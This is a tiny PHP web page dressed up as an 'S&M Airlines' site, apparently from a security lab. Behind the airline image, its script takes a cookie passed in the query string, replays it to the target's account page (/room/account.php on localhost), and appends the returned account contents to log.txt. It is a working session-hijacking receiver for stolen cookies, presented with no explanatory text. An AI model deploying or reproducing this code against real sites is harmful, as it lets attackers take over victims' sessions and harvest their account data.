<html>
<head><title>S&M Airlines</title></head>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<?php
$request = "GET /room/account.php HTTP/1.1\r\n";
$request.= "Host: localhost\r\n";
$request.= "Cookie: {$_SERVER['QUERY_STRING']}\r\n";
$request.= "Connection :close\r\n";
$request.= "\r\n";
$s=fsockopen("localhost",80,$errno,$errstr,30);
fputs($s,$request);
$content='';
while(!feof($s))
{
  $content.=fgets($s,4096);
}
fclose($s);
$f=fopen("log.txt","a");
fwrite($f,$content);
fclose($f);
?>
<img src="sm.jpeg">
</body>
</html>